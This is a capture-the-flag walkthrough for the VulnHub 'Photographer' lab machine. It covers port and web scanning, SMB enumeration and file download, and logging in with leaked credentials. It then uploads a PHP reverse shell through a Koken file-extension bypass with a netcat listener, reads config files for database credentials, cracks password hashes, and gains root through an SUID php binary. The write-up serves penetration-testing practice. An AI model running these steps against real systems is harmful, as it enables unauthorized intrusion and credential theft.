# VulnHub Walkthrough: 📷 Photographer

Photographer Walkthrough

### Details
* Name: Photographer ([VulnHub](https://www.vulnhub.com/entry/photographer-1,726/))


### Network Scan

```bash
# Scan ports 0-65535
nmap -A -p0-65535 192.168.1.10

# Scan all ports, enumerate HTTP, etc.
sudo nmap -sC -sV -A -O -p- -T4 -script http-enum 192.168.1.10
```

Discovered open ports:
* 80: *HTTP* 
* 139: *NetBIOS* - Samba SMB
* 445: *NetBIOS* - Samba SMB
* 8000: *HTTP* 

### HTTP directory enumeration

```bash
# Gobuster scan: Medium wordlist
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -t 20 -u http://192.168.1.10

# Gobuster scan: Large wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.10

# Nikto scan
nikto -h http://192.168.1.10

# dirb scan
dirb http://192.168.1.10
```

### Website Exploration

Found a login page at `http://192.168.1.10:8000/admin`. 

I then noticed that the website was using a framework called *Kenko*. I was then curious to see if there was any exploits for this framework. 

```bash
searchploit kenko
```

This returned a promising exploit, which we will save for later.
```bash
searchsploit -m 48706
```

### SMB Server

```bash
# Scan SMB Server
smbmap -H 192.168.1.10 -P 445 2>&1
```

From here, we discover that the directory sambashare is available.

```bash
# Display files in 'sambashare' directory
smbmap -H 192.168.1.10 -P 445 -r sambashare -q
```

From here we can see that there is 2 files in the sambashare directory.

I found a tool called smbget that allows you to download files from a SMB server. 
```bash
# Download 'mailsent.txt'
smbget --user=192.168.1.10/guest -r smb://192.168.1.10/sambashare/mailsent.txt

# Download 'wordpress.bkp.zip'
smbget --user=192.168.1.10/guest -r smb://192.168.1.10/sambashare/wordpress.bkp.zip
```

I first looked through the `mailsent.txt` file and found several useful information. The email contained a extremely large hint for the password of a user named *daisa*.
```txt
Users/Information:
	- daisa ahomi - daisa@photographer.com | password: babygirl
	- Agi Clarence - agi@photographer.com
```

### Exploiting Kenko

Now that I had daisa's login credentials, I was able to login to the website.

Once I logged in, I was then able to use the exploit I found earlier to gain a shell on the machine.

1. On my local computer, create a file titled `image.php.jpg` containing the reverse shell code got from reshells.com (PHP PentestMonkey).

2. Start a netcat listener on my local machine: `nc -lvnp 4444`

3. Open burpsuite & capture the upload the (`image.php.jpg`).

4. Intercept the request & change the file extension to `image.php.jpg` to `image.php`.

Once you click on the file, the shell will be executed and you will have a shell on the machine. The instructions mentioned above, can also be seen in the exploit I found earlier.

### Privilege Escalation

Once I was in, I looked around the machine and found several deadends.

I first found a file called `users.txt` in the `/home/daisa` directory. This file contained the following MD5 hash: `d41d8cd98f00b204e9800998ecf8427e`.
I tried decrypting this file using john but was unsuccessful.
```bash
# Not using wordlist
john --format=raw-md5 users.txt

# Using wordlist
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt users.txt
```

I then ran `cat /etc/passwd` and found that there was a mysql server running on the machine. Through a little digging, I was able to find the credentials for the mysql server in the `/var/www/html/koken/storage/configuration/key.php` file.
```txt
/var/www/html/koken/storage/configuration/database.php
	- hostname --> localhost
	- database --> koken
	- username --> kokenuser
	- password --> user_password_here
```

I then used these credentials to login to the mysql server.
```bash
mysql -u kokenuser -puser_password_here
```

Once I was in, I lookaround but wasn't able to find anything useful.
In the koken database, I found a table called `koken_users` which contained the email and passwords for the users on the website, that being only one user, *daisa*.
```sql
SELECT email, password
FROM koken_users;
```

This then returned the following:
* email: `daisa@photographer.com`
* password: `$2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK`

The password however is hashed using a bcrypt algorithm. I knew this by trying to decrypt the hash using hashcat using the following command which returned a list of possible hash-modes to use:
```bash
hashcat -a 0 -O -w 3 mysql_hash.txt /usr/share/wordlists/rockyou.txt
```
I then visted a bcrypt website to help verify that the string/password "babygirl" would decrypt the hash.
However, all of this was unnecessary, but I guess it was a good learning experience.

I then ran the following command to find all the files on the machine that had the SUID bit set:
```bash
find / -perm -u=s -type f 2>/dev/null
```
From here I found an interesting bin file, `/usr/bin/php7.2`. I then went to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) and found that I could use this to escalate my privileges to root.
```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```
